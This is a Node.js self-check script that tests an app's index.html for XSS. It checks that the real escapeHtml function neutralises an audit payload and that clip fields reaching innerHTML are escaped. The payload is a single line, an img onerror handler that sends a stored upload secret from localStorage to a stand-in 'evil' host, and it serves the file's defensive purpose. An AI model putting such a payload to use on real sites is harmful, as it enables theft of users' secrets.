// Run with: node index-xss.selfcheck.js
// Guards the innerHTML sinks in index.html that take data from the synced
// `hype_audio` row. That row is writable by anyone holding the public key
// (audit 2026-09-29 P0-1), so any clip field reaching innerHTML unescaped is an
// XSS sink -- and the upload passphrase sits in localStorage (P1-1).
'use strict';
const fs = require('fs');
const path = require('path');
const vm = require('vm');

const html = fs.readFileSync(path.join(__dirname, 'index.html'), 'utf8');

function fail(msg) { console.error('FAIL: ' + msg); process.exit(1); }
function assert(cond, msg) { if (!cond) fail(msg); }

// 1. The real escapeHtml (extracted from index.html, not re-implemented here)
//    neutralises the exact payload from the audit, in attribute context.
const m = html.match(/function escapeHtml\(s\) \{[\s\S]*?\n    \}/);
assert(m, 'could not find escapeHtml in index.html');
const sandbox = {};
vm.createContext(sandbox);
vm.runInContext(m[0] + '; this.escapeHtml = escapeHtml;', sandbox);
const payload = `x"><img src=x onerror="fetch('//evil/'+localStorage.hype_audio_upload_secret)">`;
const escaped = sandbox.escapeHtml(payload);
assert(!/["<>]/.test(escaped), `escapeHtml left a raw quote/angle bracket: ${escaped}`);
assert(sandbox.escapeHtml("a'b") === 'a&#39;b', 'escapeHtml must escape single quotes');

// 2. The clip id must never be concatenated raw into the search-result markup.
assert(/data-clip-id="' \+ escapeHtml\(c\.id\) \+ '"/.test(html), 'search result data-clip-id must use escapeHtml(c.id)');
// Capture what follows the concatenation instead of a negative lookahead (backtracking
// over \s* would let the lookahead "see" a space and falsely pass/fail).
for (const [, next] of html.matchAll(/data-clip-id="'\s*\+\s*(\S+)/g)) {
  assert(next.startsWith('escapeHtml('), `a data-clip-id attribute is built from an unescaped value: ${next}`);
}

// 3. Any innerHTML line that interpolates a mentality label must escape it
//    (the label is the raw, data-controlled mentality string).
html.split('\n').forEach((line, i) => {
  if (line.includes('innerHTML') && line.includes('mentalityLabel(')) {
    assert(line.includes('escapeHtml(mentalityLabel('), `index.html:${i + 1} puts mentalityLabel() in innerHTML without escapeHtml`);
  }
});

// 4. No raw clip field (id/title/pillar/mentality/transcript/storage_url) in an
//    innerHTML string built by concatenation without escapeHtml.
const RAW = /'\s*\+\s*(?!escapeHtml)(?:c|clip)\.(?:id|title|pillar|mentality|transcript|storage_url|suggested_title)\b/;
html.split('\n').forEach((line, i) => {
  if (RAW.test(line) && /'\s*<|>\s*'|data-|class=/.test(line)) {
    fail(`index.html:${i + 1} concatenates a raw clip field into markup: ${line.trim().slice(0, 120)}`);
  }
});

console.log('index-xss.selfcheck.js: all assertions passed');
